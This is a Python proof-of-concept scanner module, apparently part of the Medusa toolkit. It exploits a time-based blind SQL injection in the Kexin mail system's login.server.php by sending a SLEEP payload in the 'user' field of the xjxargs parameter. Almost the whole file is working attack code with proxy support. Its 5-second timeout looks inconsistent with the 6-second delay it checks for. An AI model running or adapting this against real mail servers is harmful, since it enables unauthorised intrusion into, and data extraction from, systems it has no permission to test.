#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 科信邮件系统login.server.php 时间盲注
referer: http://www.wooyun.org/bugs/wooyun-2010-0122071
author: Lucifer
description: 文件prog/login.server.php中,参数xjxargs存在SQL注入。
'''
#!/usr/bin/env python
# _*_ coding: utf-8 _*_

import urllib
import time
import requests

def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port

payload = "/prog/login.server.php"
post_data = {
            "xjxfun":"Function_PostLogin",
            "xjxr":"1434907361662",
            "xjxargs[]":"<xjxobj><e><k>lo_os</k><v>SWindows_NT</v></e><e><k>lo_processor</k><v>S<![CDATA[EM64T Family 15 Model 6 Stepping 8, GenuineIntel]]></v></e><e><k>lo_computername</k><v>SRD-HL-EMAIL</v></e><e><k>lo_user_agent</k><v>S<![CDATA[Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14]]></v></e><e><k>lo_ip</k><v>S...</v></e><e><k>lo_language</k><v>S<![CDATA[zh-CN,zh;q=0.8]]></v></e><e><k>user</k><v>Sadmin139' AND(SELECT * FROM (SELECT(SLEEP(6)))taSu) AND 'dwkL'='dwkL</v></e><e><k>domain</k><v>S...</v></e><e><k>passwd</k><v>Sadmin</v></e><e><k>co_language_select</k><v>S<![CDATA[../language/chinese_gb.php]]></v></e><e><k>co_sy_id</k><v>S10</v></e><e><k>random_pic</k><v>S5139</v></e><e><k>random_num</k><v>S240955</v></e></xjxobj>"
        }
def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    global   resp
    payload_url = scheme+"://"+url+payload
    headers = {
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'User-Agent': RandomAgent,
    }
    try:
        start_time = time.time()
        #s = requests.session()
        if ProxyIp!=None:
            proxies = {
                # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                "http": "http://" + str(ProxyIp)
            }
            resp = requests.post(payload_url, data=post_data, headers=headers, proxies=proxies, timeout=5, verify=False)
        elif ProxyIp==None:
            resp = requests.post(payload_url, data=post_data,headers=headers, timeout=5, verify=False)
        con = resp.text
        code = resp.status_code
        if time.time() - start_time >= 6:
            Medusa = "{} 存在科信邮件系统login.server.php 时间盲注漏洞\r\n漏洞详情:\r\nPayload:{}\r\nPost:{}\r\n".format(url, payload_url,post_data)
            return (Medusa)
    except Exception as e:
        pass
